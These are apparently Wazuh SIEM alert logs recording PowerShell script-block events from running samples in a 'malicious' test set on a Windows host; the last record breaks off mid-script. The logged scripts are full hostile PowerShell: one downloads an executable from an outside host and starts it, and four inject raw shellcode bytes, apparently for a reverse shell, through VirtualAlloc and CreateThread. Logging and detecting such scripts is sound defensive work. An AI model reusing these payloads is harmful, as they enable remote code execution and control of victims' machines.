{"timestamp":"2026-07-06T02:18:46.220+0000","rule":{"level":4,"description":"Powershell script querying system environment variables","id":"91816","mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]},"firedtimes":7,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304326.2187039","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:06.2550019Z","eventRecordID":"144936","processID":"7400","threadID":"8576","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n(New-Object System.Net.WebClient).DownloadFile('http://rgho.st/6hrkjYlX4',\"$env:TEMP\\wincat.exe\");Start-Process (\"$env:TEMP\\wincat.exe\")\r\n\r\nScriptBlock ID: 7c0dd9c5-27fa-4ac4-a7d5-f7ad381b2084\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1619.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"(New-Object System.Net.WebClient).DownloadFile('http://rgho.st/6hrkjYlX4',\\\"$env:TEMP\\\\wincat.exe\\\");Start-Process (\\\"$env:TEMP\\\\wincat.exe\\\")","scriptBlockId":"7c0dd9c5-27fa-4ac4-a7d5-f7ad381b2084","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1619.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:18:47.254+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":62,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304327.2189580","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:07.0590352Z","eventRecordID":"144940","processID":"3000","threadID":"1720","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x19,0x68,0x02,0x00,0x1f,0x90,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 8bdf6ca8-fd76-47b0-95ba-4ae90004ea15\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1622.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x19,0x68,0x02,0x00,0x1f,0x90,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"8bdf6ca8-fd76-47b0-95ba-4ae90004ea15","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1622.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:18:47.262+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":63,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304327.2201389","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:07.8354003Z","eventRecordID":"144944","processID":"4252","threadID":"4816","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd0,0xb8,0xd6,0x62,0x05,0x7e,0xd9,0x74,0x24,0xf4,0x5b,0x33,0xc9,0xb1,0x47,0x31,0x43,0x18,0x03,0x43,0x18,0x83,0xc3,0xd2,0x80,0xf0,0x82,0x32,0xc6,0xfb,0x7a,0xc2,0xa7,0x72,0x9f,0xf3,0xe7,0xe1,0xeb,0xa3,0xd7,0x62,0xb9,0x4f,0x93,0x27,0x2a,0xc4,0xd1,0xef,0x5d,0x6d,0x5f,0xd6,0x50,0x6e,0xcc,0x2a,0xf2,0xec,0x0f,0x7f,0xd4,0xcd,0xdf,0x72,0x15,0x0a,0x3d,0x7e,0x47,0xc3,0x49,0x2d,0x78,0x60,0x07,0xee,0xf3,0x3a,0x89,0x76,0xe7,0x8a,0xa8,0x57,0xb6,0x81,0xf2,0x77,0x38,0x46,0x8f,0x31,0x22,0x8b,0xaa,0x88,0xd9,0x7f,0x40,0x0b,0x08,0x4e,0xa9,0xa0,0x75,0x7f,0x58,0xb8,0xb2,0x47,0x83,0xcf,0xca,0xb4,0x3e,0xc8,0x08,0xc7,0xe4,0x5d,0x8b,0x6f,0x6e,0xc5,0x77,0x8e,0xa3,0x90,0xfc,0x9c,0x08,0xd6,0x5b,0x80,0x8f,0x3b,0xd0,0xbc,0x04,0xba,0x37,0x35,0x5e,0x99,0x93,0x1e,0x04,0x80,0x82,0xfa,0xeb,0xbd,0xd5,0xa5,0x54,0x18,0x9d,0x4b,0x80,0x11,0xfc,0x03,0x65,0x18,0xff,0xd3,0xe1,0x2b,0x8c,0xe1,0xae,0x87,0x1a,0x49,0x26,0x0e,0xdc,0xae,0x1d,0xf6,0x72,0x51,0x9e,0x07,0x5a,0x95,0xca,0x57,0xf4,0x3c,0x73,0x3c,0x04,0xc1,0xa6,0x93,0x54,0x6d,0x19,0x54,0x05,0xcd,0xc9,0x3c,0x4f,0xc2,0x36,0x5c,0x70,0x09,0x5f,0xf7,0x8a,0xd9,0x49,0x26,0xa0,0xed,0xe2,0x34,0xca,0x1c,0xaf,0xb1,0x2c,0x74,0x5f,0x94,0xe7,0xe0,0xc6,0xbd,0x7c,0x91,0x07,0x68,0xf9,0x91,0x8c,0x9f,0xfd,0x5f,0x65,0xd5,0xed,0x37,0x85,0xa0,0x4c,0x91,0x9a,0x1e,0xfa,0x1d,0x0f,0xa5,0xad,0x4a,0xa7,0xa7,0x88,0xbc,0x68,0x57,0xff,0xb7,0xa1,0xcd,0x40,0xaf,0xcd,0x01,0x41,0x2f,0x98,0x4b,0x41,0x47,0x7c,0x28,0x12,0x72,0x83,0xe5,0x06,0x2f,0x16,0x06,0x7f,0x9c,0xb1,0x6e,0x7d,0xfb,0xf6,0x30,0x7e,0x2e,0x07,0x0c,0xa9,0x16,0x7d,0x7c,0x69;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 0a9f7467-efa8-4ef8-968f-733c58c7d9bf\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1666.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd0,0xb8,0xd6,0x62,0x05,0x7e,0xd9,0x74,0x24,0xf4,0x5b,0x33,0xc9,0xb1,0x47,0x31,0x43,0x18,0x03,0x43,0x18,0x83,0xc3,0xd2,0x80,0xf0,0x82,0x32,0xc6,0xfb,0x7a,0xc2,0xa7,0x72,0x9f,0xf3,0xe7,0xe1,0xeb,0xa3,0xd7,0x62,0xb9,0x4f,0x93,0x27,0x2a,0xc4,0xd1,0xef,0x5d,0x6d,0x5f,0xd6,0x50,0x6e,0xcc,0x2a,0xf2,0xec,0x0f,0x7f,0xd4,0xcd,0xdf,0x72,0x15,0x0a,0x3d,0x7e,0x47,0xc3,0x49,0x2d,0x78,0x60,0x07,0xee,0xf3,0x3a,0x89,0x76,0xe7,0x8a,0xa8,0x57,0xb6,0x81,0xf2,0x77,0x38,0x46,0x8f,0x31,0x22,0x8b,0xaa,0x88,0xd9,0x7f,0x40,0x0b,0x08,0x4e,0xa9,0xa0,0x75,0x7f,0x58,0xb8,0xb2,0x47,0x83,0xcf,0xca,0xb4,0x3e,0xc8,0x08,0xc7,0xe4,0x5d,0x8b,0x6f,0x6e,0xc5,0x77,0x8e,0xa3,0x90,0xfc,0x9c,0x08,0xd6,0x5b,0x80,0x8f,0x3b,0xd0,0xbc,0x04,0xba,0x37,0x35,0x5e,0x99,0x93,0x1e,0x04,0x80,0x82,0xfa,0xeb,0xbd,0xd5,0xa5,0x54,0x18,0x9d,0x4b,0x80,0x11,0xfc,0x03,0x65,0x18,0xff,0xd3,0xe1,0x2b,0x8c,0xe1,0xae,0x87,0x1a,0x49,0x26,0x0e,0xdc,0xae,0x1d,0xf6,0x72,0x51,0x9e,0x07,0x5a,0x95,0xca,0x57,0xf4,0x3c,0x73,0x3c,0x04,0xc1,0xa6,0x93,0x54,0x6d,0x19,0x54,0x05,0xcd,0xc9,0x3c,0x4f,0xc2,0x36,0x5c,0x70,0x09,0x5f,0xf7,0x8a,0xd9,0x49,0x26,0xa0,0xed,0xe2,0x34,0xca,0x1c,0xaf,0xb1,0x2c,0x74,0x5f,0x94,0xe7,0xe0,0xc6,0xbd,0x7c,0x91,0x07,0x68,0xf9,0x91,0x8c,0x9f,0xfd,0x5f,0x65,0xd5,0xed,0x37,0x85,0xa0,0x4c,0x91,0x9a,0x1e,0xfa,0x1d,0x0f,0xa5,0xad,0x4a,0xa7,0xa7,0x88,0xbc,0x68,0x57,0xff,0xb7,0xa1,0xcd,0x40,0xaf,0xcd,0x01,0x41,0x2f,0x98,0x4b,0x41,0x47,0x7c,0x28,0x12,0x72,0x83,0xe5,0x06,0x2f,0x16,0x06,0x7f,0x9c,0xb1,0x6e,0x7d,0xfb,0xf6,0x30,0x7e,0x2e,0x07,0x0c,0xa9,0x16,0x7d,0x7c,0x69;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"0a9f7467-efa8-4ef8-968f-733c58c7d9bf","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1666.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:18:48.653+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":64,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304328.2212698","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:08.6264960Z","eventRecordID":"144948","processID":"7640","threadID":"8792","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xb2,0x4a,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 547abfe8-4dbb-45fa-8221-0050e1edc905\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1671.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xb2,0x4a,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"547abfe8-4dbb-45fa-8221-0050e1edc905","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1671.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:18:49.667+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":65,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304329.2223647","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:09.4659221Z","eventRecordID":"144952","processID":"1884","threadID":"2540","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 